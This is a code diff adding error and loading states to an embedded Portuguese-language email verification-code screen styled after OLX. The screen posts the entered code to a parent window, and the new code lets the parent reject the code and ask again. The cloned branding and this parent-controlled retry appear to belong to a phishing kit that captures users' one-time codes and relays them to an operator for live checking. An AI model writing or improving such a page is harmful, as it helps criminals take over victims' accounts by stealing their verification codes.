@@ -279,6 +279,10 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
   .back-row{display:flex;justify-content:flex-start;margin:18px 0 0}
   .back-link{background:none;border:0;color:#6E0AD6;font:inherit;font-size:16px;font-weight:600;cursor:pointer;padding:0;text-decoration:none}
   .back-link:hover{text-decoration:underline}
+  .code-error{display:none;color:#c0392b;font-size:13px;margin:-4px 0 12px;text-align:center}
+  .loading-row{display:none;align-items:center;justify-content:center;gap:10px;padding:14px 0;color:#6b6b6b;font-size:14px}
+  .loading-row .spinner{width:18px;height:18px;border:2px solid #e5e7eb;border-top-color:#6E0AD6;border-radius:50%;animation:olxSpin .9s linear infinite}
+  @keyframes olxSpin{to{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
@@ -314,6 +318,13 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
       <button type="button" class="resend-link" id="resend-btn">Reenviar código</button>
     </div>
 
+    <p class="code-error" id="code-error">Código inválido. Verifique e tente novamente.</p>
+
+    <div class="loading-row" id="loading-row">
+      <div class="spinner"></div>
+      <span>Verificando código...</span>
+    </div>
+
     <div class="alertbox" role="status">
       <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" aria-hidden="true">
         <path fill="currentColor" fill-rule="evenodd" d="M22.75,5.99 L22.75,18 C22.75,19.51 21.51,20.75 20,20.75 L4,20.75 C2.49,20.75 1.25,19.51 1.25,18 L1.25,5.99 C1.26,4.48 2.49,3.25 4,3.25 L20,3.25 C21.51,3.25 22.74,4.48 22.75,5.99 Z M21.2,5.65 C21.04,5.13 20.56,4.75 20,4.75 L4,4.75 C3.44,4.75 2.96,5.13 2.8,5.65 L12,12.08 L21.2,5.65 Z M21.25,7.44 L12.43,13.61 C12.17,13.8 11.83,13.8 11.57,13.61 L2.75,7.44 L2.75,18 C2.75,18.69 3.31,19.25 4,19.25 L20,19.25 C20.69,19.25 21.25,18.69 21.25,18 L21.25,7.44 Z"></path>
@@ -336,10 +347,33 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
   <script>
     (function(){
       var inputs = Array.prototype.slice.call(document.querySelectorAll('#code-wrap input'));
+      var loadingRow = document.getElementById('loading-row');
+      var errorEl = document.getElementById('code-error');
+      var submitted = false;
+
+      function setLoading(on){
+        if(loadingRow) loadingRow.style.display = on ? 'flex' : 'none';
+        inputs.forEach(function(i){ i.disabled = on; });
+      }
+
+      function showError(msg){
+        if(errorEl){
+          errorEl.textContent = msg || 'Código inválido. Verifique e tente novamente.';
+          errorEl.style.display = 'block';
+        }
+        inputs.forEach(function(i){ i.style.borderColor = '#e53e3e'; i.value = ''; i.disabled = false; });
+        if(loadingRow) loadingRow.style.display = 'none';
+        submitted = false;
+        if(inputs[0]) inputs[0].focus();
+      }
 
       function emitIfFull(){
+        if(submitted) return;
         var code = inputs.map(function(i){ return i.value || ''; }).join('');
         if(code.length === inputs.length){
+          submitted = true;
+          if(errorEl) errorEl.style.display = 'none';
+          setLoading(true);
           window.parent.postMessage({
             type: 'iframe-help-action',
             action: 'email-code-submit',
@@ -348,9 +382,20 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
         }
       }
 
+      // Permite que o pai resete a tela em caso de rejeição
+      window.addEventListener('message', function(e){
+        var d = e.data;
+        if(!d || typeof d !== 'object') return;
+        if(d.type === 'iframe-code-error'){
+          showError(d.message);
+        }
+      });
+
       inputs.forEach(function(inp, idx){
         inp.addEventListener('input', function(){
           inp.value = (inp.value || '').replace(/\\D/g, '').slice(0, 1);
+          inp.style.borderColor = '';
+          if(errorEl) errorEl.style.display = 'none';
           if(inp.value && idx < inputs.length - 1){
             inputs[idx + 1].focus();
           }
